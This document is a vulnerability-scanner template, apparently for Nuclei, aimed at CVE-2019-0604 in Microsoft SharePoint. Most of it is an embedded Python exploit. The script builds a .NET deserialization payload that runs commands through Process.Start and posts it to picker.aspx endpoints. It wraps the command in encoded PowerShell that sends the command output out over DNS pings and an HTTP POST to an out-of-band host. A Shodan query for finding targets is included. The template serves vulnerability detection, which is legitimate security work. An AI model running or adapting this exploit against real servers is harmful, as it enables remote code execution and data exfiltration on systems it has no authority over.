code:
- engine:
  - py
  - python3
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(interactsh_request, hex_encode(marker))
    type: dsl
  source: "import os\nimport sys\nimport base64\nimport argparse\nfrom copy import\
    \ deepcopy\nimport urllib3\nimport requests\nimport lxml.html\nimport codecs\n\
    from xml.sax.saxutils import escape\nurllib3.disable_warnings()\ndefault_ua =\
    \ 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML,\
    \ like Gecko) Chrome/79.0.3945.130 Safari/537.36'\npart1 = 'System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:'\n\
    part2 = '<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:a=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:b=\"http://www.w3.org/2001/XMLSchema\"><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType\
    \ a:type=\"b:string\">%s</anyType></MethodParameters><ObjectInstance a:type=\"\
    XamlReader\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider>'\n\
    content = '<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\
    \ xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:c=\"clr-namespace:System;assembly=mscorlib\"\
    \ xmlns:d=\"clr-namespace:System.Diagnostics;assembly=system\"> <ObjectDataProvider\
    \ x:Key=\"\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\"> <ObjectDataProvider.MethodParameters>\
    \ <c:String>%(base)s</c:String> <c:String>%(arg)s</c:String> </ObjectDataProvider.MethodParameters>\
    \ </ObjectDataProvider> </ResourceDictionary>'\npaths = [os.getenv(\"Path\"),\
    \ '/_vti_pvt/picker.aspx', '/_app_bin/picker.aspx', '/_controltemplates/picker.aspx',\
    \ '/_login/picker.aspx', '/_windows/picker.aspx', '/_layouts/15/picker.aspx',\
    \ '/_wpresources/picker.aspx', '/_vti_bin/picker.aspx']\nhost = os.getenv('RootURL')\n\
    domain = os.getenv('OAST')\nuser = os.getenv('username')\npswd = os.getenv('password')\n\
    def html_escape(s):\n    _ = escape(s)\n    _ = _.replace('\"', '&quot;')\n  \
    \  return _\ndef _0604(cmd):\n    if ' ' in cmd and '|' not in cmd[:cmd.find('\
    \ ')]: # avoid command problem (TODO : find a better solution)\n        _bin,\
    \ _arg = cmd.split(' ', 1)\n    else:\n        _bin = 'cmd'\n        _arg = '/c\
    \ ' + cmd\n    payload = part1 + part2 % html_escape(content % dict(base=html_escape(_bin),\
    \ arg=html_escape(_arg)))\n    o = ''.join(codecs.encode(codecs.encode(x, 'utf-16be'),\
    \ 'hex').decode('ascii')[::-1] for x in payload)\n    return '__bp' + format(len(o),\
    \ 'x')[::-1] + o\ndef main():\n    auth = ''\n    cmd = 'echo ' + os.getenv('marker')\n\
    \    if (user != None) and (pswd != None):\n        auth = user + ':' + pswd\n\
    \        ntlm = True\n    else:\n        ntlm = False\n    if host is None:\n\
    \        print(\"missing target. You must specify -u <url>\")\n        exit(1)\n\
    \    if domain is not None:\n        print('OOB: \"%s\" will be executed in POWERSHELL\
    \ context' % (cmd))\n        __var_raw = '$a'\n        __var_hex = '$b'\n    \
    \    __dns_code = '''\n$bl = %(v_hex)s.length;$l = 60;$i = 0;\nwhile($i -lt $bl)\
    \ {\n$l = if(($bl - $i) -gt $l) { $l } else { $bl - $i };\n$v = %(v_hex)s.substring($i,\
    \ $l);\nping -n 1 \"$i.$v.%(domain)s\";\n$i += $l; }\n        '''.strip() % dict(domain=domain,\
    \ v_hex=__var_hex)\n        __post_code = '''\niwr -Uri %(domain)s -Method post\
    \ -Body %(v_raw)s;\n        '''.strip() % dict(domain=domain, v_raw=__var_raw)\n\
    \        __code = '''\n%(v_raw)s = %(cmd)s;\n$Encode = new-object \"System.Text.UTF8Encoding\"\
    ;\n$bytearray = $Encode.GetBytes(%(v_raw)s);\n%(v_hex)s = \"\";\nForeach ($i in\
    \ $bytearray) {\n  %(v_hex)s = %(v_hex)s + $i.ToString(\"X\").PadLeft(2,\"0\"\
    );\n}\n        '''.strip() % dict(cmd=cmd, v_raw=__var_raw, v_hex=__var_hex)\n\
    \        __code += __dns_code\n        __code = base64.b64encode(__code.encode('UTF-16LE')).decode()\n\
    \        cmd = 'powershell -ep bypass -enc %s' % (__code)\n        print(cmd)\n\
    \    if ntlm:\n        from requests_ntlm import HttpNtlmAuth\n        _auth =\
    \ HttpNtlmAuth(*auth.split(':', 1))\n    else:\n        _auth = None\n    _headers\
    \ = {'User-Agent': default_ua}\n    req_kwargs = {\n        'headers': _headers,\n\
    \        'auth': _auth,\n        'verify': False\n    }\n    def auto_sp_attack(kwargs):\n\
    \        for item in paths:\n            url = os.getenv('RootURL') + item\n \
    \           # get sharepoint version (2019,2016 / 2013 / 2010)\n            res\
    \ = requests.get(url, **kwargs)\n            spversion = res.headers.get('MicrosoftSharePointTeamServices',\
    \ '16').split('.', 1)[0] + '.0.0.0'\n            kwargs['params'] = dict(PickerDialogType='Microsoft.SharePoint.WebControls.ItemPickerDialog,Microsoft.SharePoint,Version=%s,Culture=neutral,PublicKeyToken=71e9bce111e9429c'\
    \ % spversion)\n            # get viewstate & ev from picker.aspx\n          \
    \  if res.status_code != 200:\n                print('%s failed [%s]' % (item,\
    \ res.status_code))\n                continue\n            else:\n           \
    \     break\n        rt = lxml.html.fromstring(res.content)\n        spandata\
    \ = list(filter(lambda x: x.get('name').endswith('hiddenSpanData'), rt.xpath('//input[contains(@name,\
    \ \"hiddenSpanData\")]')))[0].get('name')\n        kwargs['data'] = {\n      \
    \      '__VIEWSTATE': rt.get_element_by_id('__VIEWSTATE').value if rt.xpath('//input[@id=\"\
    __VIEWSTATE\"]') else '',\n            '__EVENTVALIDATION': rt.get_element_by_id('__EVENTVALIDATION').value\
    \ if rt.xpath('//input[@id=\"__EVENTVALIDATION\"]') else '',\n        }\n    \
    \    payload = _0604(cmd)\n        kwargs['data'][spandata] = payload\n      \
    \  return requests.post(url, **kwargs)\n    attack_fn = auto_sp_attack\n    res\
    \ = attack_fn(deepcopy(req_kwargs))\n    if all(s in res.text for s in ['\"ms-pickerresultheadertr\"\
    ', 'Administrators, see the server log for more information.']):\n      print('%s\
    \ succeded (%s)' % (res.url, res.status_code))\nif __name__ == '__main__':\n \
    \   main()\n"
id: CVE-2019-0604
info:
  author: tree-chtsec,pszyszkowski
  classification:
    cve-id: CVE-2019-0604
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
    epss-percentile: 0.99987
    epss-score: 0.94441
  description: 'Microsoft SharePoint contains a remote code execution caused by failure
    to check the source markup of an application package, letting remote attackers
    execute arbitrary code, exploit requires sending malicious application package.

    '
  impact: 'Remote attackers can execute arbitrary code on the server, potentially
    leading to full system compromise.

    '
  metadata:
    product: sharepoint
    shodan-query: cpe:"cpe:2.3:a:microsoft:sharepoint_server"
    vendor: microsoft
    verified: true
  name: Microsoft SharePoint - Remote Code Execution
  reference:
  - https://github.com/Gh0st0ne/weaponized-0604
  - https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-0604
  - https://nvd.nist.gov/vuln/detail/cve-2019-0604
  remediation: 'Fixed in security update published Feb 12, 2019

    '
  severity: critical
  tags: cve,cve2019,sharepoint,microsoft,rce,kev,vkev,vuln
variables:
  OAST: '{{interactsh-url}}'
  marker: '{{randbase(5)}}'
